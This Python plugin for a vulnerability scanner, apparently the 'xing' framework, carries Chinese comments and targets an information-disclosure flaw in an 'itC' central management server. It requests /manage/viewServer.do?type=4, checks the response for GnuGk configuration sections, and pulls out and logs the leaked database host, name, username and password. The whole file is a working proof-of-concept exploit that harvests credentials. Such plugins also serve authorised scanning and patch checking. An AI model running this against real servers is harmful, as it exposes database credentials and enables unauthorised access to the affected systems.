from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req
from xing.core import PluginType, SchemeType
import re

class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "itC 中心管理服务器 信息泄露"
        self.app_name = 'itC'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

    def verify(self, target):
        test_url = target.rstrip('/') + '/manage/viewServer.do?type=4'

        try:
            resp = http_req(test_url, timeout=10)

            if resp.status_code == 200:
                content = resp.text

                # 检测 GnuGk 配置文件中的敏感信息
                # 特征：包含 SQLPasswordAuth 配置节，且包含数据库连接信息
                patterns = [
                    r'\[SQLPasswordAuth\]',          # GnuGk 数据库认证配置节
                    r'Host\s*=\s*[^\s]+:\d+',        # 数据库地址和端口
                    r'Database\s*=\s*[^\s]+',        # 数据库名称
                    r'Username\s*=\s*[^\s]+',        # 数据库用户名
                    r'Password\s*=\s*[^\s]+',        # 数据库密码
                    r'\[Gatekeeper::Main\]',         # GnuGk 主配置节
                    r'Home\s*=\s*\d+\.\d+\.\d+\.\d+', # GK 服务器地址
                    r'admin\s*=\s*[A-Za-z0-9+/=]+',  # admin 密码（Base64）
                ]

                matched = []
                for pattern in patterns:
                    if re.search(pattern, content, re.IGNORECASE):
                        matched.append(pattern)

                # 如果匹配到 3 个以上特征，基本确定存在漏洞
                if len(matched) >= 3:
                    self.logger.info("发现 itC 中心管理服务器 信息泄露漏洞")
                    # 尝试提取关键信息
                    host_match = re.search(r'Host\s*=\s*([^\s]+)', content)
                    db_match = re.search(r'Database\s*=\s*([^\s]+)', content)
                    user_match = re.search(r'Username\s*=\s*([^\s]+)', content)
                    pwd_match = re.search(r'Password\s*=\s*([^\s]+)', content)

                    info_parts = []
                    if host_match:
                        info_parts.append(f"Host: {host_match.group(1)}")
                    if db_match:
                        info_parts.append(f"DB: {db_match.group(1)}")
                    if user_match:
                        info_parts.append(f"User: {user_match.group(1)}")
                    if pwd_match:
                        info_parts.append(f"Password: {pwd_match.group(1)}")

                    if info_parts:
                        self.logger.info("泄露的敏感信息: {}".format(" | ".join(info_parts)))

                    return test_url

                # 如果匹配到 2 个特征，但其中包含 Host + Password 组合，也视为漏洞
                if len(matched) >= 2:
                    has_host = any('Host' in p for p in matched)
                    has_pwd = any('Password' in p for p in matched)
                    has_db = any('Database' in p for p in matched)
                    if (has_host and has_pwd) or (has_host and has_db):
                        self.logger.info("发现 itC 中心管理服务器 信息泄露漏洞")
                        return test_url

        except Exception as e:
            self.logger.debug(f"请求异常: {e}")

        return None